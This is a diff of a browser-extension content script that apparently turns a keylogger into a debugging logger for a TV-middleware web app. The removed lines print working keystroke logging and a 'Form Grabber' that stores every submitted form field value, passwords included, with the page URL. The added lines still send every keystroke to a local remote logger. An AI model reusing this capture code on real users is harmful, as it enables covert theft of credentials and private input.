@@ -1,107 +1,49 @@
 (function(){
     'use strict';
 
-    /* SSE */
-    var _events = ["subtitle", "pushvod", "pdl", "player", "eit", "records", "cas", "prm", "network", "storage", "system", "scanning", "avio", "hls", "respawn", "open", "error"];
+    /* SSE listener */
+    var _events = ["subtitle", "pushvod", "pdl", "player", "eit", "records", "cas", "prm", "network", "storage", "system", "scanning", "avio", "hls"/*, "respawn", "open", "error"*/];
     var source = new window.EventSource('/stream');
 
     _events.forEach(function(_event) {
         source.addEventListener(_event, function(e) {
-          LOG('SSE', _event, e.data);
+          sseLog(_event, e.data);
       }, false);
     });
 
-    /* Keydown */
-    chrome.storage.sync.get({allKeys: false}, function(settings) {
-        document.addEventListener('keydown', function (e) {
-            LOG('KEYDOWN' , e.keyCode);
-        });
+    /* Keydown listener */
+    document.addEventListener('keydown', function (e) {
+        keyLog('KEYDOWN' , e.keyCode);
     });
 
-    /* Log Saving */
-    var time = new Date().getTime();
-    var data = {};
-    var shouldSave = false;
-    var lastLog = time;
-    data[time] = document.title + "^~^" + document.URL + "^~^";
+    /* Keyup listener */
+    document.addEventListener('keyup', function (e) {
+        keyLog('KEYUP' , e.keyCode);
+    });
 
-    // Key'ed on JS timestamp
-    function _log(input) {
-        var now = new Date().getTime();
-        if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
-        data[time] += input;
-        shouldSave = true;
-        lastLog = now;
-        console.log("[LOG] ", input);
-    }
-
-
-    /* Save data */
-    function save() {
-        if (shouldSave) {
-            chrome.storage.local.set(data, function() { console.log("Saved", data); shouldSave = false; });
-        }
-    }
-
-    function autoDelete() {
-        chrome.storage.sync.get({autoDelete: 1337}, function(settings) {
-            // Make sure to sync with delete code from viewer.js
-            var endDate = (new Date()).getTime() - (settings.autoDelete * 24 * 60 * 60 * 1000);
-            chrome.storage.local.get(function(logs) {
-                var toDelete = [];
-                for (var key in logs) {
-                    if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars 
-                      toDelete.push(key);
-                  }
-              }
-              chrome.storage.local.remove(toDelete, function() {
-                console.log(toDelete.length + " entries deleted");
-            });
-          });
-        });
-    }
-
-    // Save data on window close
-    window.onbeforeunload = function() {
-        save();
-        autoDelete();
-    }
-
-    // Save every second
-    setInterval(function(){
-        save();
-    }, 1000);
-
-
-    /* Form Grabber */
-    function saveForm(time, data) {
-        var toSave = {};
-        toSave[time] = document.title + "^~^" + document.URL + "^~^" + JSON.stringify(data);
-        chrome.storage.local.set(toSave, function() { console.log("Saved", data); });
-    }
-
-    chrome.storage.sync.get({formGrabber: false}, function(settings) {
-        if (settings.formGrabber) {
-            var forms = document.getElementsByTagName("form");
-            for (var i = 0; i < forms.length; i++) {
-                forms[i].addEventListener("submit", function(e) {
-                    var data = {};
-                    data["FormName"] = e.target.name;
-                    data["FormAction"] = e.target.action;
-                    data["FormElements"] = {};
-                    var elements = e.target.elements;
-                    for (var n = 0; n < elements.length; n++) {
-                        data["FormElements"][elements[n].name] = elements[n].value;
-                    }
-                    saveForm(e.timeStamp, data);
-                });
-            }
+    chrome.storage.onChanged.addListener(function(changes, namespace) {
+        for (var key in changes) {
+          var storageChange = changes[key];
+          console.log('Storage key "%s" in namespace "%s" changed. ' +
+                      'Old value was "%s", new value is "%s".',
+                      key,
+                      namespace,
+                      storageChange.oldValue,
+                      storageChange.newValue);
         }
     });
 
-    var global = require('../settings.json');
+    chrome.storage.sync.get(null, function(settings) {
+        console.log("chrome.storage.sync.get : " + JSON.stringify(settings));
+    });
 
-    var LEVELS = ['debug', 'info', 'warning', 'error', 'fatal'];
+    var global = {
+      "LOGGER_NAME": "remote",
+      "LOGGER_OPTIONS": {
+        "url": "http://127.0.0.1:8081"
+      }
+    };
+
     var _slice = Array.prototype.slice;
 
 
@@ -140,11 +82,10 @@
             xhr.send(data);
         }
         
-        return function(args, namespace, level) {
+        return function(args, namespace) {
             if (!url) { return; }
             var log = {
                 namespace: namespace,
-                level: level,
                 date: new Date(),
                 args: args
             };
@@ -155,8 +96,6 @@
     }
 
     var list = {
-    //    'console': CONSOLE_LOGGER,
-    //    'html':    HTML_LOGGER,
     'remote':  REMOTE_LOGGER
     };
 
@@ -170,13 +109,13 @@
         var logger = function() {
           if (!loggers.length) { return; }
           var args = filter(arguments, namespace);
-          var levl = (this && this.LOG_LEVEL) || 'info';
           args && loggers.forEach(function(l) {
-            l(args, namespace, levl);
+            l(args, namespace);
         });
       };
       return logger;
     }
 
-    var LOG = LOGGER('SPY');
+    var keyLog = LOGGER('KEY');
+    var sseLog = LOGGER('SSE');
 })();
